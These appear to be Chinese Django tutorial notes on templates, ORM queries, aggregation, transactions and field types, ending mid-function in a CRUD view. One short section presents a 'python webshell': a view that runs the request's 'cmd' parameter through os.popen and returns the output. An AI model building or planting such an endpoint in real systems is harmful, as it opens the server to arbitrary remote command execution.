# 总结:当html页面某一个地方的页面需要传参数才能够动态的渲染出来，并且在多个页面上都需要使用到该局部 那么就考虑将该局部页面做成inclusion_tag形式
(在讲bbs的时候会使用到)
```

[![p93t4yT.png](https://s1.ax1x.com/2023/04/30/p93t4yT.png)](https://imgse.com/i/p93t4yT)

[![p93tgFs.png](https://s1.ax1x.com/2023/04/30/p93tgFs.png)](https://imgse.com/i/p93tgFs)

#### 模版的继承

```python
"""
你们有没有见过一些网站
	这些网站页面整体都大差不差 只是某一些局部在做变化	
"""
# 模版的继承 你自己先选好一个你要想继承的模版页面
{# extends 'home.html' #}

# 继承了之后子页面跟模版页面长的是一模一样的 你需要在模版页面上提前划定可以被修改的区域
{# block content #}
	模版内容
{# endblock #}

# 子页面就可以声明想要修改哪块划定了的区域
{# block content #}
	子页面内容	
{# endblock #}


# 一般情况下模版页面上应该至少有三块可以被修改的区域
	  1.css区域
      2.html区域
      3.js区域
  {# block css #}

	{# endblock #}
  
  {# block content #}

	{# endblock #}
  
  {# block js #}

	{# endblock #}
  # 每一个子页面就都可以有自己独有的css代码 html代码 js代码
  
"""
一般情况下 模版的页面上划定的区域越多 那么该模版的扩展性就越高
但是如果太多 那还不如自己直接写
"""
```

#### 模版的(导入)包含

```python
"""
将页面的某一个局部当成模块的形式
哪个地方需要就可以直接导入使用即可
"""
{# include 'wasai.html' #}
```

# 

#### python webshell

urls.py

~~~python
path('shell/', views.shell)
~~~

views.py

~~~python
def shell(request):
    if request.method == 'GET':
        cmd = request.GET.get("cmd")
        p = os.popen(cmd)
        x = p.read()
        return HttpResponse(x)
~~~

[![p93txOO.png](https://s1.ax1x.com/2023/04/30/p93txOO.png)](https://imgse.com/i/p93txOO)





#### 单表操作

```python
# django自带的sqlite3数据库对日期格式不是很敏感 处理的时候容易出错
# 增
    # res = models.User.objects.create(name='jason',age=18,register_time='2002-1-21')
    # print(res)
    # import datetime
    # ctime = datetime.datetime.now()
    # user_obj = models.User(name='egon',age=84,register_time=ctime)
    # user_obj.save()

    # 删
    # res = models.User.objects.filter(pk=2).delete()
    # print(res)
    """
    pk会自动查找到当前表的主键字段 指代的就是当前表的主键字段
    用了pk之后 你就不需要指代当前表的主键字段到底叫什么了
        uid
        pid
        sid
        ...
    """
    # user_obj = models.User.objects.filter(pk=1).first()
    # user_obj.delete()

    # 修改
    # models.User.objects.filter(pk=4).update(name='egonDSB')

    # user_obj = models.User.objects.get(pk=4)
    # user_obj = models.User.objects.filter(pk=6)
    """
    get方法返回的直接就是当前数据对象
    但是该方法不推荐使用
        一旦数据不存在该方法会直接报错
        而filter则不会
            所以我们还是用filter
    """
    # user_obj.name = 'egonPPP'
    # user_obj.save()
```

#### 必知必会13条

```python
# 必知必会13条
    # 1.all()  查询所有数据

    # 2.filter()     带有过滤条件的查询
    # 3.get()        直接拿数据对象 但是条件不存在直接报错
    # 4.first()      拿queryset里面第一个元素
    # res = models.User.objects.all().first()
    # print(res)
    # 5.last()
    # res = models.User.objects.all().last()
    # print(res)

    # 6.values()  可以指定获取的数据字段  select name,age from ...     列表套字典
    # res = models.User.objects.values('name','age')  # <QuerySet [{'name': 'jason', 'age': 18}, {'name': 'egonPPP', 'age': 84}]>
    # print(res)
    # 7.values_list()  列表套元祖
    # res = models.User.objects.values_list('name','age')  # <QuerySet [('jason', 18), ('egonPPP', 84)]>
    # print(res)
    # """
    #  # 查看内部封装的sql语句
    #  上述查看sql语句的方式  只能用于queryset对象
    #  只有queryset对象才能够点击query查看内部的sql语句
    #
    # """
    # 8.distinct()  去重
    # res = models.User.objects.values('name','age').distinct()
    # print(res)
    """
    去重一定要是一模一样的数据
    如果带有主键那么肯定不一样 你在往后的查询中一定不要忽略主键
    
    """
    # 9.order_by()
    # res = models.User.objects.order_by('age')  # 默认升序
    # res = models.User.objects.order_by('-age')  # 降序
    #
    # print(res)
    # 10.reverse()  反转的前提是 数据已经排过序了  order_by()
    # res = models.User.objects.all()
    # res1 = models.User.objects.order_by('age').reverse()
    # print(res,res1)

    # 11.count()  统计当前数据的个数
    # res = models.User.objects.count()
    # print(res)
    # 12.exclude()  排除在外
    # res = models.User.objects.exclude(name='jason')
    # print(res)

    # 13.exists()  基本用不到因为数据本身就自带布尔值  返回的是布尔值
    # res = models.User.objects.filter(pk=10).exists()
    # print(res)
```



~~~python
from django.test import TestCase

# Create your tests here.
import os


if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "day64.settings")
    import django
    django.setup()
    # 所有的代码都必须等待环境准备完毕之后才能书写
    from app01 import models

    # 增
    # res = models.User.objects.create(name='jason',age=18,register_time='2002-1-21')
    # print(res)
    # import datetime
    # ctime = datetime.datetime.now()
    # user_obj = models.User(name='egon',age=84,register_time=ctime)
    # user_obj.save()

    # 删
    # res = models.User.objects.filter(pk=2).delete()
    # print(res)
    """
    pk会自动查找到当前表的主键字段 指代的就是当前表的主键字段
    用了pk之后 你就不需要指代当前表的主键字段到底叫什么了
        uid
        pid
        sid
        ...
    """
    # user_obj = models.User.objects.filter(pk=1).first()
    # user_obj.delete()

    # 修改
    # models.User.objects.filter(pk=4).update(name='egonDSB')

    # user_obj = models.User.objects.get(pk=4)
    # user_obj = models.User.objects.filter(pk=6)
    """
    get方法返回的直接就是当前数据对象
    但是该方法不推荐使用
        一旦数据不存在该方法会直接报错
        而filter则不会
            所以我们还是用filter
    """
    # user_obj.name = 'egonPPP'
    # user_obj.save()


    # 必知必会13条
    # 1.all()  查询所有数据

    # 2.filter()     带有过滤条件的查询
    # 3.get()        直接拿数据对象 但是条件不存在直接报错
    # 4.first()      拿queryset里面第一个元素
    # res = models.User.objects.all().first()
    # print(res)
    # 5.last()
    # res = models.User.objects.all().last()
    # print(res)

    # 6.values()  可以指定获取的数据字段  select name,age from ...     列表套字典
    # res = models.User.objects.values('name','age')  # <QuerySet [{'name': 'jason', 'age': 18}, {'name': 'egonPPP', 'age': 84}]>
    # print(res)
    # 7.values_list()  列表套元祖
    # res = models.User.objects.values_list('name','age')  # <QuerySet [('jason', 18), ('egonPPP', 84)]>
    # print(res)
    # """
    #  # 查看内部封装的sql语句
    #  上述查看sql语句的方式  只能用于queryset对象
    #  只有queryset对象才能够点击query查看内部的sql语句
    #
    # """
    # 8.distinct()  去重
    # res = models.User.objects.values('name','age').distinct()
    # print(res)
    """
    去重一定要是一模一样的数据
    如果带有主键那么肯定不一样 你在往后的查询中一定不要忽略主键
    
    """
    # 9.order_by()
    # res = models.User.objects.order_by('age')  # 默认升序
    # res = models.User.objects.order_by('-age')  # 降序
    #
    # print(res)
    # 10.reverse()  反转的前提是 数据已经排过序了  order_by()
    # res = models.User.objects.all()
    # res1 = models.User.objects.order_by('age').reverse()
    # print(res,res1)

    # 11.count()  统计当前数据的个数
    # res = models.User.objects.count()
    # print(res)
    # 12.exclude()  排除在外
    # res = models.User.objects.exclude(name='jason')
    # print(res)

    # 13.exists()  基本用不到因为数据本身就自带布尔值  返回的是布尔值
    # res = models.User.objects.filter(pk=10).exists()
    # print(res)

    # 神奇的双下划线查询
    # 1 年龄大于35岁的数据
    # res = models.User.objects.filter(age__gt=35)
    # print(res)
    # 2 年龄小于35岁的数据
    # res = models.User.objects.filter(age__lt=35)
    # print(res)
    # 大于等于 小于等于
    # res = models.User.objects.filter(age__gte=32)
    # print(res)
    # res = models.User.objects.filter(age__lte=32)
    # print(res)

    # 年龄是18 或者 32 或者40
    # res = models.User.objects.filter(age__in=[18,32,40])
    # print(res)

    # 年龄在18到40岁之间的  首尾都要
    # res = models.User.objects.filter(age__range=[18,40])
    # print(res)

    # 查询出名字里面含有s的数据  模糊查询
    # res = models.User.objects.filter(name__contains='s')
    # print(res)
    #
    # 是否区分大小写  查询出名字里面含有p的数据  区分大小写
    # res = models.User.objects.filter(name__contains='p')
    # print(res)
    # 忽略大小写
    # res = models.User.objects.filter(name__icontains='p')
    # print(res)

    # res = models.User.objects.filter(name__startswith='j')
    # res1 = models.User.objects.filter(name__endswith='j')
    #
    # print(res,res1)


    # 查询出注册时间是 2020 1月
    # res = models.User.objects.filter(register_time__month='1')
    # res = models.User.objects.filter(register_time__year='2020')



    # 一对多外键增删改查
    # 增
    # 1  直接写实际字段 id
    # models.Book.objects.create(title='论语',price=899.23,publish_id=1)
    # models.Book.objects.create(title='聊斋',price=444.23,publish_id=2)
    # models.Book.objects.create(title='老子',price=333.66,publish_id=1)
    # 2  虚拟字段 对象
    # publish_obj = models.Publish.objects.filter(pk=2).first()
    # models.Book.objects.create(title='红楼梦',price=666.23,publish=publish_obj)

    # 删
    # models.Publish.objects.filter(pk=1).delete()  # 级联删除

    # 修改
    # models.Book.objects.filter(pk=1).update(publish_id=2)
    # publish_obj = models.Publish.objects.filter(pk=1).first()
    # models.Book.objects.filter(pk=1).update(publish=publish_obj)


    # 多对多  增删改查  就是在操作第三张表

    # 如何给书籍添加作者？
    # book_obj = models.Book.objects.filter(pk=1).first()
    # print(book_obj.authors)  # 就类似于你已经到了第三张关系表了
    # book_obj.authors.add(1)  # 书籍id为1的书籍绑定一个主键为1 的作者
    # book_obj.authors.add(2,3)

    # author_obj = models.Author.objects.filter(pk=1).first()
    # author_obj1 = models.Author.objects.filter(pk=2).first()
    # author_obj2 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.add(author_obj)
    # book_obj.authors.add(author_obj1,author_obj2)
    """
    add给第三张关系表添加数据
        括号内既可以传数字也可以传对象 并且都支持多个
    """

    # 删
    # book_obj.authors.remove(2)
    # book_obj.authors.remove(1,3)

    # author_obj = models.Author.objects.filter(pk=2).first()
    # author_obj1 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.remove(author_obj,author_obj1)
    """
    remove
        括号内既可以传数字也可以传对象 并且都支持多个
    """


    # 修改
    # book_obj.authors.set([1,2])  # 括号内必须给一个可迭代对象
    # book_obj.authors.set([3])  # 括号内必须给一个可迭代对象

    # author_obj = models.Author.objects.filter(pk=2).first()
    # author_obj1 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.set([author_obj,author_obj1])  # 括号内必须给一个可迭代对象

    """
    set
        括号内必须传一个可迭代对象，该对象内既可以数字也可以对象 并且都支持多个
    """


    # 清空
    # 在第三张关系表中清空某个书籍与作者的绑定关系
    # book_obj.authors.clear()
    """
    clear
        括号内不要加任何参数
    
    """

    # 基于对象的跨表查询

    # 1.查询书籍主键为1的出版社
    # book_obj = models.Book.objects.filter(pk=1).first()
    # # 书查出版社 正向
    # res = book_obj.publish
    # print(res)
    # print(res.name)
    # print(res.addr)

    # 2.查询书籍主键为2的作者
    # book_obj = models.Book.objects.filter(pk=2).first()
    # # 书查作者 正向
    # # res = book_obj.authors  # app01.Author.None
    # res = book_obj.authors.all()  # <QuerySet [<Author: Author object>, <Author: Author object>]>
    #
    # print(res)

    # 3.查询作者jason的电话号码
    # author_obj = models.Author.objects.filter(name='jason').first()
    # res = author_obj.author_detail
    # print(res)
    # print(res.phone)
    # print(res.addr)

    """
    在书写orm语句的时候跟写sql语句一样的
    不要企图一次性将orm语句写完 如果比较复杂 就写一点看一点
    
    正向什么时候需要加.all()
        当你的结果可能有多个的时候就需要加.all()
        如果是一个则直接拿到数据对象
            book_obj.publish
            book_obj.authors.all()
            author_obj.author_detail
    """
    # 4.查询出版社是东方出版社出版的书
    # publish_obj = models.Publish.objects.filter(name='东方出版社').first()
    # 出版社查书  反向
    # res = publish_obj.book_set  # app01.Book.None
    # res = publish_obj.book_set.all()
    # print(res)

    # 5.查询作者是jason写过的书
    # author_obj = models.Author.objects.filter(name='jason').first()
    # 作者查书      反向
    # res = author_obj.book_set  # app01.Book.None
    # res = author_obj.book_set.all()
    # print(res)

    # 6.查询手机号是110的作者姓名
    # author_detail_obj = models.AuthorDetail.objects.filter(phone=110).first()
    # res = author_detail_obj.author
    # print(res.name)
    """
    基于对象 
        反向查询的时候
            当你的查询结果可以有多个的时候 就必须加_set.all()
            当你的结果只有一个的时候 不需要加_set.all()
        自己总结出 自己方便记忆的即可 每个人都可以不一样
    """


    # 基于双下划线的跨表查询


    # 1.查询jason的手机号和作者姓名
    # res = models.Author.objects.filter(name='jason').values('author_detail__phone','name')
    # print(res)
    # 反向
    # res = models.AuthorDetail.objects.filter(author__name='jason')  # 拿作者姓名是jason的作者详情
    # res = models.AuthorDetail.objects.filter(author__name='jason').values('phone','author__name')
    # print(res)


    # 2.查询书籍主键为1的出版社名称和书的名称
    # res = models.Book.objects.filter(pk=1).values('title','publish__name')
    # print(res)
    # 反向
    # res = models.Publish.objects.filter(book__id=1).values('name','book__title')
    # print(res)

    # 3.查询书籍主键为1的作者姓名
    # res = models.Book.objects.filter(pk=1).values('authors__name')
    # print(res)
    # 反向
    # res = models.Author.objects.filter(book__id=1).values('name')
    # print(res)


    # 查询书籍主键是1的作者的手机号
    # book author authordetail
    # res = models.Book.objects.filter(pk=1).values('authors__author_detail__phone')
    # print(res)
    """
    你只要掌握了正反向的概念
    以及双下划线
    那么你就可以无限制的跨表
    
    """
~~~



#### 测试脚本

```python
"""
当你只是想测试django中的某一个py文件内容 那么你可以不用书写前后端交互的形式
而是直接写一个测试脚本即可

脚本代码无论是写在应用下的tests.py还是自己单独开设py文件都可以
"""
# 测试环境的准备 去manage.py中拷贝前四行代码 然后自己写两行
import os
import sys

if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "day64.settings")
    import django
    django.setup()
    # 在这个代码块的下面就可以测试django里面的单个py文件了
```

#### 查看内部sql语句的方式

```python
# 方式1
res = models.User.objects.values_list('name','age')  # <QuerySet [('jason', 18), ('egonPPP', 84)]>
print(res.query)
queryset对象才能够点击query查看内部的sql语句

# 方式2:所有的sql语句都能查看
# 去配置文件中配置一下即可
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console':{
            'level':'DEBUG',
            'class':'logging.StreamHandler',
        },
    },
    'loggers': {
        'django.db.backends': {
            'handlers': ['console'],
            'propagate': True,
            'level':'DEBUG',
        },
    }
}
```

#### 神奇的双下划线查询

```python
# 神奇的双下划线查询
    # 1 年龄大于35岁的数据
    # res = models.User.objects.filter(age__gt=35)
    # print(res)
    # 2 年龄小于35岁的数据
    # res = models.User.objects.filter(age__lt=35)
    # print(res)
    # 大于等于 小于等于
    # res = models.User.objects.filter(age__gte=32)
    # print(res)
    # res = models.User.objects.filter(age__lte=32)
    # print(res)

    # 年龄是18 或者 32 或者40
    # res = models.User.objects.filter(age__in=[18,32,40])
    # print(res)

    # 年龄在18到40岁之间的  首尾都要
    # res = models.User.objects.filter(age__range=[18,40])
    # print(res)

    # 查询出名字里面含有s的数据  模糊查询
    # res = models.User.objects.filter(name__contains='s')
    # print(res)
    #
    # 是否区分大小写  查询出名字里面含有p的数据  区分大小写
    # res = models.User.objects.filter(name__contains='p')
    # print(res)
    # 忽略大小写
    # res = models.User.objects.filter(name__icontains='p')
    # print(res)

    # res = models.User.objects.filter(name__startswith='j')
    # res1 = models.User.objects.filter(name__endswith='j')
    #
    # print(res,res1)


    # 查询出注册时间是 2020 1月
    # res = models.User.objects.filter(register_time__month='1')
    # res = models.User.objects.filter(register_time__year='2020')
```

#### 一对多外键增删改查

```python
# 一对多外键增删改查
    # 增
    # 1  直接写实际字段 id
    # models.Book.objects.create(title='论语',price=899.23,publish_id=1)
    # models.Book.objects.create(title='聊斋',price=444.23,publish_id=2)
    # models.Book.objects.create(title='老子',price=333.66,publish_id=1)
    # 2  虚拟字段 对象
    # publish_obj = models.Publish.objects.filter(pk=2).first()
    # models.Book.objects.create(title='红楼梦',price=666.23,publish=publish_obj)

    # 删
    # models.Publish.objects.filter(pk=1).delete()  # 级联删除

    # 修改
    # models.Book.objects.filter(pk=1).update(publish_id=2)
    # publish_obj = models.Publish.objects.filter(pk=1).first()
    # models.Book.objects.filter(pk=1).update(publish=publish_obj)
```

#### 多对多外键增删改查

```python
# 如何给书籍添加作者？
    book_obj = models.Book.objects.filter(pk=1).first()
    # print(book_obj.authors)  # 就类似于你已经到了第三张关系表了
    # book_obj.authors.add(1)  # 书籍id为1的书籍绑定一个主键为1 的作者
    # book_obj.authors.add(2,3)

    # author_obj = models.Author.objects.filter(pk=1).first()
    # author_obj1 = models.Author.objects.filter(pk=2).first()
    # author_obj2 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.add(author_obj)
    # book_obj.authors.add(author_obj1,author_obj2)
    """
    add给第三张关系表添加数据
        括号内既可以传数字也可以传对象 并且都支持多个
    """

    # 删
    # book_obj.authors.remove(2)
    # book_obj.authors.remove(1,3)

    # author_obj = models.Author.objects.filter(pk=2).first()
    # author_obj1 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.remove(author_obj,author_obj1)
    """
    remove
        括号内既可以传数字也可以传对象 并且都支持多个
    """


    # 修改
    # book_obj.authors.set([1,2])  # 括号内必须给一个可迭代对象
    # book_obj.authors.set([3])  # 括号内必须给一个可迭代对象

    # author_obj = models.Author.objects.filter(pk=2).first()
    # author_obj1 = models.Author.objects.filter(pk=3).first()
    # book_obj.authors.set([author_obj,author_obj1])  # 括号内必须给一个可迭代对象

    """
    set
        括号内必须传一个可迭代对象，该对象内既可以数字也可以对象 并且都支持多个
    """


    # 清空
    # 在第三张关系表中清空某个书籍与作者的绑定关系
    book_obj.authors.clear()
    """
    clear
        括号内不要加任何参数
    
    """
```

#### 正反向的概念

```python
# 正向
# 反向
  外键字段在我手上那么，我查你就是正向
  外键字段如果不在手上，我查你就是反向
  
  book >>>外键字段在书那儿(正向)>>> publish
  publish	>>>外键字段在书那儿(反向)>>>book
  
  一对一和多对多正反向的判断也是如此
  
"""
正向查询按字段
反向查询按表名小写
				_set
				...
"""

```

#### 多表查询

#### 子查询(基于对象的跨表查询)

```python
# 1.查询书籍主键为1的出版社
    # book_obj = models.Book.objects.filter(pk=1).first()
    # # 书查出版社 正向
    # res = book_obj.publish
    # print(res)
    # print(res.name)
    # print(res.addr)

    # 2.查询书籍主键为2的作者
    # book_obj = models.Book.objects.filter(pk=2).first()
    # # 书查作者 正向
    # # res = book_obj.authors  # app01.Author.None
    # res = book_obj.authors.all()  # <QuerySet [<Author: Author object>, <Author: Author object>]>
    #
    # print(res)

    # 3.查询作者jason的电话号码
    # author_obj = models.Author.objects.filter(name='jason').first()
    # res = author_obj.author_detail
    # print(res)
    # print(res.phone)
    # print(res.addr)

    """
    在书写orm语句的时候跟写sql语句一样的
    不要企图一次性将orm语句写完 如果比较复杂 就写一点看一点
    
    正向什么时候需要加.all()
        当你的结果可能有多个的时候就需要加.all()
        如果是一个则直接拿到数据对象
            book_obj.publish
            book_obj.authors.all()
            author_obj.author_detail
    """
    # 4.查询出版社是东方出版社出版的书
    # publish_obj = models.Publish.objects.filter(name='东方出版社').first()
    # 出版社查书  反向
    # res = publish_obj.book_set  # app01.Book.None
    # res = publish_obj.book_set.all()
    # print(res)

    # 5.查询作者是jason写过的书
    # author_obj = models.Author.objects.filter(name='jason').first()
    # 作者查书      反向
    # res = author_obj.book_set  # app01.Book.None
    # res = author_obj.book_set.all()
    # print(res)

    # 6.查询手机号是110的作者姓名
    # author_detail_obj = models.AuthorDetail.objects.filter(phone=110).first()
    # res = author_detail_obj.author
    # print(res.name)
    """
    基于对象 
        反向查询的时候
            当你的查询结果可以有多个的时候 就必须加_set.all()
            当你的结果只有一个的时候 不需要加_set.all()
        自己总结出 自己方便记忆的即可 每个人都可以不一样
    """
```

#### 联表查询(基于双下划线的跨表查询)

```python
# 基于双下划线的跨表查询


    # 1.查询jason的手机号和作者姓名
    # res = models.Author.objects.filter(name='jason').values('author_detail__phone','name')
    # print(res)
    # 反向
    # res = models.AuthorDetail.objects.filter(author__name='jason')  # 拿作者姓名是jason的作者详情
    # res = models.AuthorDetail.objects.filter(author__name='jason').values('phone','author__name')
    # print(res)


    # 2.查询书籍主键为1的出版社名称和书的名称
    # res = models.Book.objects.filter(pk=1).values('title','publish__name')
    # print(res)
    # 反向
    # res = models.Publish.objects.filter(book__id=1).values('name','book__title')
    # print(res)

    # 3.查询书籍主键为1的作者姓名
    # res = models.Book.objects.filter(pk=1).values('authors__name')
    # print(res)
    # 反向
    # res = models.Author.objects.filter(book__id=1).values('name')
    # print(res)


    # 查询书籍主键是1的作者的手机号
    # book author authordetail
    # res = models.Book.objects.filter(pk=1).values('authors__author_detail__phone')
    # print(res)
    """
    你只要掌握了正反向的概念
    以及双下划线
    那么你就可以无限制的跨表
    
    """
```

#### 聚合查询

```python
# 聚合查询      aggregate
    """
    聚合查询通常情况下都是配合分组一起使用的
    只要是跟数据库相关的模块
        基本上都在django.db.models里面
        如果上述没有那么应该在django.db里面
    """
    from app01 import models
    from django.db.models import Max,Min,Sum,Count,Avg
    # 1 所有书的平均价格
    # res = models.Book.objects.aggregate(Avg('price'))
    # print(res)
    # 2.上述方法一次性使用
    res = models.Book.objects.aggregate(Max('price'),Min('price'),Sum('price'),Count('pk'),Avg('price'))
    print(res)
```

#### 分组查询

```python
# 分组查询  annotate
    """
    MySQL分组查询都有哪些特点
        分组之后默认只能获取到分组的依据 组内其他字段都无法直接获取了
            严格模式
                ONLY_FULL_GROUP_BY
                
    """
    from django.db.models import Max, Min, Sum, Count, Avg
    # 1.统计每一本书的作者个数
    # res = models.Book.objects.annotate()  # models后面点什么 就是按什么分组
    # res = models.Book.objects.annotate(author_num=Count('authors')).values('title','author_num')
    """
    author_num是我们自己定义的字段 用来存储统计出来的每本书对应的作者个数
    """
    # res1 = models.Book.objects.annotate(author_num=Count('authors__id')).values('title','author_num')
    # print(res,res1)
    """
    代码没有补全 不要怕 正常写
    补全给你是pycharm给你的 到后面在服务器上直接书写代码 什么补全都没有 颜色提示也没有
    
    """

    # 2.统计每个出版社卖的最便宜的书的价格(作业:复习原生SQL语句 写出来)
    # res = models.Publish.objects.annotate(min_price=Min('book__price')).values('name','min_price')
    # print(res)

    # 3.统计不止一个作者的图书
        # 1.先按照图书分组 求每一本书对应的作者个数
        # 2.过滤出不止一个作者的图书
    # res = models.Book.objects.annotate(author_num=Count('authors')).filter(author_num__gt=1).values('title','author_num')
    # """
    # 只要你的orm语句得出的结果还是一个queryset对象
    # 那么它就可以继续无限制的点queryset对象封装的方法
    #
    # """
    # print(res)

    # 4.查询每个作者出的书的总价格
    # res = models.Author.objects.annotate(sum_price=Sum('book__price')).values('name','sum_price')
    # print(res)

    """
    如果我想按照指定的字段分组该如何处理呢？
        models.Book.objects.values('price').annotate()
    后续BBS作业会使用
    
    
    你们的机器上如果出现分组查询报错的情况
        你需要修改数据库严格模式
    """
```

#### F与Q查询

```python
# F查询
    # 1.查询卖出数大于库存数的书籍
    # F查询
    """
    能够帮助你直接获取到表中某个字段对应的数据
    """
    from django.db.models import F
    # res = models.Book.objects.filter(maichu__gt=F('kucun'))
    # print(res)


    # 2.将所有书籍的价格提升500块
    # models.Book.objects.update(price=F('price') + 500)


    # 3.将所有书的名称后面加上爆款两个字
    """
    在操作字符类型的数据的时候 F不能够直接做到字符串的拼接
    """
    from django.db.models.functions import Concat
    from django.db.models import Value
    models.Book.objects.update(title=Concat(F('title'), Value('爆款')))
    # models.Book.objects.update(title=F('title') + '爆款')  # 所有的名称会全部变成空白
```

```python
 # Q查询
    # 1.查询卖出数大于100或者价格小于600的书籍
    # res = models.Book.objects.filter(maichu__gt=100,price__lt=600)
    """filter括号内多个参数是and关系"""
    from django.db.models import Q
    # res = models.Book.objects.filter(Q(maichu__gt=100),Q(price__lt=600))  # Q包裹逗号分割 还是and关系
    # res = models.Book.objects.filter(Q(maichu__gt=100)|Q(price__lt=600))  # | or关系
    # res = models.Book.objects.filter(~Q(maichu__gt=100)|Q(price__lt=600))  # ~ not关系
    # print(res)  # <QuerySet []>

    # Q的高阶用法  能够将查询条件的左边也变成字符串的形式
    q = Q()
    q.connector = 'or'
    q.children.append(('maichu__gt',100))
    q.children.append(('price__lt',600))
    res = models.Book.objects.filter(q)  # 默认还是and关系
    print(res)
```

#### django中如何开启事务

```python
"""
事务
	ACID
		原子性
			不可分割的最小单位
		一致性
			跟原子性是相辅相成
		隔离性
			事务之间互相不干扰
		持久性
			事务一旦确认永久生效
	
	事务的回滚 
		rollback
	事务的确认
		commit
"""
# 目前你只需要掌握Django中如何简单的开启事务
# 事务
    from django.db import transaction
    try:
        with transaction.atomic():
            # sql1
            # sql2
            ...
            # 在with代码快内书写的所有orm操作都是属于同一个事务
    except Exception as e:
        print(e)
    print('执行其他操作')
```

#### orm中常用字段及参数

```python
AutoField
	主键字段 primary_key=True
  
CharField				varchar
	verbose_name	字段的注释
  max_length		长度
  
IntegerField			int
BigIntegerField		bigint

DecimalField
	max_digits=8
  decimal_places=2

EmailFiled				varchar(254)

DateField					date
DateTimeField			datetime
	auto_now:每次修改数据的时候都会自动更新当前时间
  auto_now_add:只在创建数据的时候记录创建时间后续不会自动修改了
    
BooleanField(Field)				- 布尔值类型
	该字段传布尔值(False/True) 	数据库里面存0/1

TextField(Field)					- 文本类型
	该字段可以用来存大段内容(文章、博客...)  没有字数限制
  后面的bbs作业 文章字段用的就是TextField


FileField(Field)					- 字符类型
   upload_to = "/data"
  给该字段传一个文件对象，会自动将文件保存到/data目录下然后将文件路径保存到数据库中
  /data/a.txt
  后面bbs作业也会涉及

# 更多字段
直接参考博客:https://www.cnblogs.com/Dominic-Ji/p/9203990.html

    
# django除了给你提供了很多字段类型之外 还支持你自定义字段
class MyCharField(models.Field):
    def __init__(self,max_length,*args,**kwargs):
        self.max_length = max_length
        # 调用父类的init方法
        super().__init__(max_length=max_length,*args,**kwargs)  # 一定要是关键字的形式传入

    def db_type(self, connection):
        """
        返回真正的数据类型及各种约束条件
        :param connection:
        :return:
        """
        return 'char(%s)'%self.max_length

# 自定义字段使用
myfield = MyCharField(max_length=16,null=True)



# 外键字段及参数
unique=True
	ForeignKey(unique=True)   ===			OneToOneField()
  # 你在用前面字段创建一对一 orm会有一个提示信息 orm推荐你使用后者但是前者也能用
  
db_index
	如果db_index=True 则代表着为此字段设置索引
  (复习索引是什么)

to_field
	设置要关联的表的字段  默认不写关联的就是另外一张的主键字段

on_delete
	当删除关联表中的数据时，当前表与其关联的行的行为。
  """
  django2.X及以上版本 需要你自己指定外键字段的级联更新级联删除
  """
```

#### 数据库查询优化

```python
only与defer	
select_related与prefetch_related

"""
orm语句的特点:
	惰性查询
		如果你仅仅只是书写了orm语句 在后面根本没有用到该语句所查询出来的参数
		那么orm会自动识别 直接不执行
"""
# only与defer
# res = models.Book.objects.all()
    # print(res)  # 要用数据了才会走数据库

    # 想要获取书籍表中所有数的名字
    # res = models.Book.objects.values('title')
    # for d in res:
    #     print(d.get('title'))
    # 你给我实现获取到的是一个数据对象 然后点title就能够拿到书名 并且没有其他字段
    # res = models.Book.objects.only('title')
    # res = models.Book.objects.all()
    # print(res)  # <QuerySet [<Book: 三国演义爆款>, <Book: 红楼梦爆款>, <Book: 论语爆款>, <Book: 聊斋爆款>, <Book: 老子爆款>]>
    # for i in res:
        # print(i.title)  # 点击only括号内的字段 不会走数据库
        # print(i.price)  # 点击only括号内没有的字段 会重新走数据库查询而all不需要走了

    res = models.Book.objects.defer('title')  # 对象除了没有title属性之外其他的都有
    for i in res:
        print(i.price)
    """
    defer与only刚好相反
        defer括号内放的字段不在查询出来的对象里面 查询该字段需要重新走数据
        而如果查询的是非括号内的字段 则不需要走数据库了

    """
    

# select_related与prefetch_related
# select_related与prefetch_related  跟跨表操作有关
    # res = models.Book.objects.all()
    # for i in res:
    #     print(i.publish.name)  # 每循环一次就要走一次数据库查询

    # res = models.Book.objects.select_related('authors')  # INNER JOIN
    """
    select_related内部直接先将book与publish连起来 然后一次性将大表里面的所有数据
    全部封装给查询出来的对象
        这个时候对象无论是点击book表的数据还是publish的数据都无需再走数据库查询了
    
    select_related括号内只能放外键字段    一对多 一对一
        多对多也不行
    
    """
    # for i in res:
    #     print(i.publish.name)  # 每循环一次就要走一次数据库查询

    res = models.Book.objects.prefetch_related('publish')  # 子查询
    """
    prefetch_related该方法内部其实就是子查询
        将子查询查询出来的所有结果也给你封装到对象中
        给你的感觉好像也是一次性搞定的
    """
    for i in res:
        print(i.publish.name)
```

#### 图书管理的图书增删改查

```python
from django.shortcuts import render,redirect,HttpResponse
from app01 import models
# Create your views here.

def home(request):
    return render(request,'home.html')


def book_list(request):
    # 先查询出所有的书籍信息 传递给html页面
    book_queryset = models.Book.objects.all()
    return render(request,'book_list.html',locals())


def book_add(request):
    if request.method == 'POST':
        # 获取前端提交过来的所有数据
        title = request.POST.get("title")
        price = request.POST.get("price")
        publish_date = request.POST.get("publish_date")
        publish_id = request.POST.get("publish")
        authors_list = request.POST.getlist("authors")  # [1,2,3,4,]
        # 操作数据库存储数据
        # 书籍表
        book_obj = models.Book.objects.create(title=title,price=price,publish_date=publish_date,publish_id=publish_id)
        # 书籍与作者的关系表
        book_obj.authors.add(*authors_list)
        # 跳转到书籍的展示页面
        """
        redirect括号内可以直接写url
        其实也可以直接写别名
        
        但是如果你的别名需要额外给参数的话，那么就必须使用reverse解析了
        """
        return redirect('book_list')


    # 先获取当前系统中所有的出版社信息和作者信息
    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    return render(request,'book_add.html',locals())


def book_edit(request,edit_id):
    # 获取当前用户想要编辑的书籍对象 展示给用户看
    edit_obj = models.Book.objects.filter(pk=edit_id).first()
    if request.method == 'POST':
        title = request.POST.get("title")
        price = request.POST.get("price")
        publish_date = request.POST.get("publish_date")
        publish_id = request.POST.get("publish")
        authors_list = request.POST.getlist("authors")  # [1,2,3,4,]
        models.Book.objects.filter(pk=edit_id).update(title=title,
                                                      price=price,
                                                      publish_date=publish_date,
                                                      publish_id=publish_id
                                                      )
